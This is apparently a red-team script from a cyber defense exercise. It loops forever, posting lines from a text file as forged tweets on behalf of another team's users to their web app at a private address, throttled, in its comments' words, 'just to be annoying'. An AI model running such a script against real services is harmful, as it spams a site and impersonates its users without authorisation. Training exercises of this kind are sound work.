# Alex Rosse
# CDT Red Team
# Python Script to send post requests to add potato pics
# to blue team 2's web servers

import json
import requests
import time
import base64
import os

blue2url = 'http://10.0.2.4:5000/tweet/add-tweet'

# Our Users
redTeamUsers = ['dlennon','mjvl','wDestler','hTubman123','JaneDoe','jbarrett01','johncena','lskywalker']

# Get Team 2 Users
blue2json = open('blue2.json',)
data2 = json.load(blue2json)
blue2json.close()
blue2 = []

for u in data2['following']:
    if (u['username']) not in redTeamUsers:
        blue2.append(u['id'])


# Words
words = open('potato.txt')
content = words.readlines()

counter = 0

# Go until the user interrupts
#
# Loop through all blue1 and blue2 users sending a tweet of
# the next potato in the folder 
#
# Will wait X seconds after each request to not DoS the website,
# just be to annoying
while(1):
    for u in blue2:
        req = {"userId" : (f"{u}"), "text" : content[counter % len(content)]}
        res = requests.post(blue2url, json = req)
        print(counter , res)
        counter += 1
        time.sleep(10)
